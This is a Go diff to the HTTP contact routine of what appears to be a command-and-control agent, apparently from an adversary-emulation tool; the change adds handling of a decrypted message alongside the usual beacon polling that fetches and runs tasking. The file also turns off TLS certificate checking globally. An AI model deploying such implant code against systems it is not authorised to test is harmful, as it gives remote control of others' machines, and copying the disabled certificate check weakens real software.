@@ -21,12 +21,18 @@ func init() {
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 }
 
-func (contact HTTP) Communicate(agent *util.AgentConfig, beacon util.Beacon) util.Beacon {
+func (contact HTTP) Communicate(agent *util.AgentConfig, beacon util.Beacon, msg string) (util.Beacon, string) {
 	checkValidHTTPTarget(agent.Address, true)
 	for {
 		refreshBeacon(agent, &beacon)
 		for agent.Contact == "http" {
-			body := beaconPOST(agent.Address, beacon)
+			var body []byte
+			if msg == "" {
+				body = beaconPOST(agent.Address, beacon)
+			} else {
+				body = []byte(util.Decrypt(msg))
+				msg = ""
+			}
 			var tempB util.Beacon
 			json.Unmarshal(body, &tempB)
 			if(len(tempB.Links)) == 0 {
@@ -35,7 +41,7 @@ func (contact HTTP) Communicate(agent *util.AgentConfig, beacon util.Beacon) uti
 			runLinks(&tempB, &beacon, agent, "")
 		}
 		if agent.Contact != "http" {
-			return beacon
+			return beacon, ""
 		}
 		beacon.Links = beacon.Links[:0]
 		jitterSleep(agent.Sleep, "HTTP")
